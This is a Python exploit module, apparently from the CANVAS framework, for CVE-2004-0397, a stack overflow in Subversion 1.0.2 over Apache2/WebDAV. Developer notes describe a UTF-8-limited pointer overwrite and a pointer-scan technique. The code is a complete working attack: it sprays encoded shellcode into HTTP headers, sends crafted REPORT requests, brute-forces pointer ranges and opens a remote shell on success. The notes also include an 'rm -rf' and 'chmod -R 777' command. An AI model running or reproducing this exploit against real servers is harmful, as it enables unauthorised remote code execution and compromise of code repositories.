#! /usr/bin/env python


# Subversion <= 1.0.2 / Apache2/WebDAV stack vs. heap exploit 
#
# as opposed to the trivial svnserve exploits (who runs svnserve?)
# this exploit targets the actual setup used most. Namely subversion
# over webdav via Apache2
#
# Bug Class: Stack overflow
#

NOTES="""


WARNING: we've encountered some database corruption on scanning for
pointers to payload. Causing even an svnadmin recover to fail. So be
careful, we advise you to locally emulate a target to debug a scan 
range with an empty test repository that can be hosed, removed and 
recreated before going live with this exploit.

A pointer scan primitive:

In principle this bug is a simple sscanf based stack overflow. Exploitation
is completely trivial with the subversion "svnserve" daemon. However svnserve
isn't really actually used by anyone. Which is why it surprised us that every
exploit out there is intended for svnserve. 

Now the actual setup used by most projects is SVN over HTTP via WebDAV extensions.
However, this somewhat complicates things. SVN requests are wrapped in XML. 
Subversion's XML handling only allows for utf-8 encoding. That means that in our
overwrite we are limited to utf-8 characters. Thus severely limiting our options.

Ultimately our approach for this bug did not focus on hitting a saved frame or
instruction pointer, but rather abuses the overwrite of a struct ptr, where the
structure in question contains a function pointer.

With the added advantage of not relying on an executable stack
we focused on an approach that relies on populating the heap with our intended
payload. Because we can do this in the actual HTTP header, we are not limited
to utf-8 encoding for our opcode, and regular HTTP badchar encoding will
suffice. 

By using our limited utf-8 charset we manipulate a primitive that looks like
jmp *0x104(%ebx) where ebx is under our utf-8 control. We can use this primitive
to "scan" for pointers that possibly point into our opcode on the heap. Practically
this approach is proven to be quite reliable. 

Development notes:

utf-8:

00-7F normal
80-c0 == c2 prepend (80 == c2 80 etc.)
c0-ff == c3 prepend with start at 0x80 to bf max

Practical range:
21 to 7f, c2 80 to c2 bf, c3 80 to c3 bf
        
22 dwords ebp hit, 23 dwords eip hit
        
Instead of the stack ovf if we do 19 dwords we hit:
0x4032dac0 in _init () from /usr/local/apache2/modules/mod_dav_svn.so
(gdb) x/i$pc
0x4032dac0 <_init+1032>:        jmp    *0x104(%%ebx)
(gdb) i r ebx
ebx            0x58585858       1482184792
(gdb)
original ebx is 0x40??????

possible route: if we can find a interesting ptr in 0x40002121 to 0x40007F7F
or 0x4000c280 to 0x4000c2bf or 0x4000c380 0x4000c3bf (+0x104) etc.

Confirmed success!

so we brute for ptrs into opcode *ebx where we control ebx with utf-8 bytes
pad the heap with a bunch of opcode reps. and we can get fairly reliable

ie (pseudo concept):
    
while start < end:
    mov 0x104(start),ptr
    mov (ptr),check
    if check == opcode:
        owned!
    end++
    
Where we use the following ranges (utf-8 bound, sscanf bug (nul terminates)):

Partial overwrites:
    
start=0x40002121
end=0x40007f7f

start=0x4000c280
end=0x4000c2bf

start=0x4000c380
end=0x4000c3bf

(align back 1 byte)

start=0x40002180
(combo byte ranges)
end=0x40007fbf

Full overwrites (remember 21-7f exclude anything else)

start=0x21212121
end=0x7f7f7f7f

etc. etc.

working on vmware:
    # base
    ovf = 'X'*(17*4)
    # byte allign when needed
    ovf += 'A'*3
    ovf += "\\xc2\\xbd\\x23"

...

Subversion <= 1.0.2 utf-8 Apache2/WebDav stack vs. heap exploit
note: this is the setup actually USED in the wild
==================================================
Scanning utf-8 ranges for pointers into payload
==================================================
trying: jmp *0x104(0x400023b4)
trying: jmp *0x104(0x400023b5)
trying: jmp *0x104(0x400023b6)
trying: jmp *0x104(0x400023b7)
trying: jmp *0x104(0x400023b8)
trying: jmp *0x104(0x400023b9)
trying: jmp *0x104(0x400023ba)
trying: jmp *0x104(0x400023bb)
trying: jmp *0x104(0x400023bc)
trying: jmp *0x104(0x400023bd)
Recycled socket :)
Initialized sendint with fd=1
Calling startup for MOSDEF shell server

...

when debugging a range:

rm -rf /svn/repository/public/ABCD;svnadmin create /svn/repository/public/ABCD;chmod -R 777 /svn
"""

import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")

import os
import getopt
import socket
import sys
import struct
import time

from exploitutils import *
from tcpexploit import *
from shelllistener import shelllistener
from shelllistener import shellfromtelnet
import addencoder
import canvasengine
import shellcodeGenerator
import linuxshell
from libs.ctelnetlib import Telnet

import mosdef
from linuxNode import linuxNode
import linuxMosdefShellServer

# GUI info
NAME="Subversion <= 1.0.2 utf-8 Apache2/WebDAV stack vs. heap exploit"
DESCRIPTION="Subversion utf-8 Apache2/WebDAV Stack Overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Collabnet"
DOCUMENTATION["Date public"] = "2004/05/19"
DOCUMENTATION["OSVDB"] = "http://osvdb.org/displayvuln.php?osvdb_id=6301"
DOCUMENTATION["References"] = "http://security.e-matters.de/advisories/082004.html"
DOCUMENTATION["Repeatability"] = "Multiple tries"
DOCUMENTATION["CVE Name"] = "CVE-2004-0397"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0397"

VERSION="0.1"


PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Linux", "x86"] ]

LINUX=0
BSD=1
SOLARIS=2

targets = {
    0 : ["Autoversioning N/A", 0],
    1 : ["Linux IA32", LINUX]
          }

class common:
    def __init__(self):
        return
    
    def connectTo(self, t_host, t_port):
        s = self.gettcpsock()
        try:
            s.connect((t_host, t_port))
        except:
            raise Exception, "Failed to connect"
        return s

class linuxIA32(tcpexploit, common):
    def __init__(self):
        tcpexploit.__init__(self)
        common.__init__(self)
        return

    def createShellcode_lnx86(self):
        shellcode = linuxshell.getNewGOcode()
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring("\x00\\/.:?\r\n%?\" ")
        shellcode = encoder.encode(shellcode)
        return shellcode
    
    def buildRequest_lnx86(self, align, overwrite, repos):
        # base padding
        ovf = 'X'*(17*4)
        # backset bytes ?
        ovf += 'A'*(4-align)
        ovf += overwrite
        
        date = "%s %d %s %d %02d:%02d:%02d.%06d (day %03d, dst %d, gmt_off %06d)"%(ovf,0,"X",0,0,0,0,0,0,0,0)

        body =  "<?xml version=\"1.0\" encoding=\"utf-8\"?>"
        body += "<S:dated-rev-report xmlns:S=\"svn:\" "
        body += "xmlns:D=\"DAV:\">"
        body += "<D:creationdate>%s</D:creationdate>"%date
        body += "</S:dated-rev-report>"
        
        #print "shellcode is : %d bytes"%len(self.shellcode)
        payload = "\x41"*(8096-len(self.shellcode))+self.shellcode
        
        request =  "REPORT %s HTTP/1.1\r\n"%repos
        request += "Host: 127.0.0.1\r\n"
        request += "User-Agent: SVN/1.0.2 (r9423) neon/0.24.5\r\n"
        request += "Keep-Alive:\r\n"
        request += "Connection: TE, Keep-Alive\r\n"
        request += "TE: trailers\r\n"
        request += "Content-Length: %d\t\n"%len(body)
        request += "Content-Type: text/xml\r\n"
        for i in range(0,56):
            request += "X-PAYLOAD: %s\r\n"%payload
        request += "\r\n"
        return (request,body)
    
    def tryIt_lnx86(self, host, port, (request,body)):
        s = self.connectTo(host, port)
        #print "ATTACH"
        #sys.stdin.read(1)
        #print "%d bytes total"%(len(request)+len(body))
        self.websend(s, request)
        self.websend(s, body)
        try:
            check = s.recv(1000)
        except:
            s.close()
            raise Exception, "No GO"
        #print check
        if "G" in check and len(check)==1:
            s.send("O")
            print "Recycled socket :)"
            #print "ATTACH!"
            #sys.stdin.read(1)
            node=linuxNode()
            node.parentnode=self.socknode
            linuxMosdefShellServer.linuxshellserver(s,node,logfunction=self.logfunction)
            node.startup()
            return node
        else:
            s.close()
            #print check
            if check.find("500 Internal Server Error") > 0:
                self.debuglog("Internal Server Error !")
            if check.find("Could not open the requested SVN filesystem") > 0:
                self.debuglog("Could not open the requested SVN filesystem !")
                raise Exception, "Abort"
            raise Exception, "No GO"
        
    def scanPtr_lnx86(self, host, port, repos):
        self.log("="*50)
        self.log("Scanning utf-8 ranges for pointers into payload")
        self.log("="*50)
        # partial, 0xc280-0xc2bf with 0x21-0x70, setback 1
        basebyte = "\xc2"
        start = 0x2180
        start = 0x23b0
        end = 0x7fbf
        while start != end:
            if self.state == self.HALT:
                self.log("Halted.")
                raise Exception, "Halted"

            ovw = basebyte+struct.pack("<H",start)
            #for c in ovw:
            #    print "%x"%ord(c),
            self.log("trying: jmp *0x104(0x4000%hx)"%start)
            # how many shots per ptr?
            for i in range(0,3):
                try:
                    shell = self.tryIt_lnx86(host,port,self.buildRequest_lnx86(1,ovw,repos))
                except Exception, msg:
                    raise Exception, msg
                # success!
                self.setInfo("%s attacking %s:%d (Succeeded!)"%(NAME,self.host,self.port))   
                return shell

            d = start&0x00ff
            c = (start&0xff00)>>8
            if d == 0xc0:
                if c == 0x80:
                    start = end
                    continue
                c += 1
                d = 0x80
                start = (c<<8)|d
            else:
                start += 1                
        # 2 byte partial overwrite, no setback
        start = 0x2121
        end = 0x7f7f
        while start != end:
            if self.state==self.HALT:
                self.log("Halted.")
                raise Exception, "Halted"
            ovw = struct.pack("<H",start)
            #for c in ovw:
            #    print "%x"%ord(c),
            self.log("trying: jmp *0x104(0x4000%hx)"%start)
            for i in range(0,3):
                try:
                    shell = self.tryIt_lnx86(host,port,self.buildRequest_lnx86(0,ovw,repos))
                except Exception, msg:
                    raise Exception, msg
                # success !
                self.setInfo("%s attacking %s:%d (Succeeded!)"%(NAME,self.host,self.port))
                return shell
            d = start&0x00ff
            c = (start&0xff00)>>8
            if d == 0x80:
                if c == 0x80:
                    start = end
                    continue
                c += 1
                d = 0x21
                start = (c<<8)|d
            else:
                start += 1
        # end of run, no success
        raise Exception, "No success"

class theexploit(linuxIA32):
    def __init__(self):
        linuxIA32.__init__(self)
        self.cmdline = 0
        self.version = 0
        self.host = ""
        self.port = 80
        self.helperhost = ""
        self.repos = ""
        self.type = 0
        self.name = NAME
        return
    
    def test(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))

        s = self.connectTo(self.host,self.port)
        if not s:
            print "[!] could not connect svndate ?"
            return 0

        probe  = "HEAD / HTTP/1.1\r\n"
        probe += "Host: 127.0.0.1\r\n"
        probe += "\r\n"
        self.websend(s,probe)
        check = self.webrecv(s)
        offset = check.find("Server: ")
        if offset < 0:
            return 0
        server = ""
        while check[offset] != "\r":
            server += check[offset]
            offset+=1
        print "Found: %s"%server
        s.close()
        vuln = ["SVN/1.0.2"]
        for version in vuln:
            if server.find(version) > 0:
                return 1
        return 0
    
    def createShellcode(self):
        try:
            name,type = targets[self.version]
        except KeyError:
            self.log("Version %d not known"%self.version)
            raise Exception, "Unknown version"
        print "Using payload for type: %s"%name
        if type == LINUX:
            self.shellcode = self.createShellcode_lnx86()
        else:
            raise Exception, "No payload for type: %s"%name
        return self.shellcode
    
    def neededListenerTypes(self):
        return []

    def run(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))

        self.repos = self.argsDict.get("repos",self.repos)
        self.socknode = self.argsDict["passednodes"][0]

        self.log("Subversion <= 1.0.2 utf-8 Apache2/WebDav stack vs. heap exploit")
        self.log("note: this is the setup actually USED in the wild")
        if self.version == 0:
            self.log("Sorry, autoversioning not yet available")
            return 0
        try:
            name,type = targets[self.version]
        except KeyError:
            self.log("Version %d not known"%self.version)
            return 0
        if type == LINUX:
            try:
                shell = self.scanPtr_lnx86(self.host,self.port,self.repos)
            except Exception, msg:
                self.log(str(msg) + " (socket error ?)")
                return 0
        else:
            self.log("No other versions implemented yet")
            return 0

        return shell

    def displayVersions(self):
        i = 0
        for listline in targets.values():
            print "Version: %d Type: %s"% (i, listline[0])
            i += 1

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    app.options=["-O repos:repository_name", "NOTE: this exploit recycles the existing connection!"]
    ret = standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()

        
                
                  


    
        
    
    
